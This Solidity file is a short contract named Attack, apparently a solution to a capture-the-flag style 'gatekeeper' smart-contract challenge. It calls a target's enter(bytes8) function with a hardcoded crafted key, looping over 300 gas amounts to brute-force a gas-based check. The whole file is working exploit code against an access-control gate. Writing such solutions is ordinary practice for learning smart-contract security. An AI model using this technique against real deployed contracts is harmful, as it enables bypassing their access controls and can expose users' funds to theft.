// SPDX-License-Identifier: MIT
pragma solidity ^0.6.3;

contract Attack {
    address public gateKeeper;

    constructor(address _gateKeeper) public {
        gateKeeper = _gateKeeper;
    }

    function attack() public {
        bytes8 _gateKey = 0x000000010000e1d2;
        for (uint256 i = 0; i<300; i++) {
            gateKeeper.call{gas: 8191*5 + i}(
                abi.encodeWithSignature("enter(bytes8)",_gateKey)
            ); 
        }
    }
}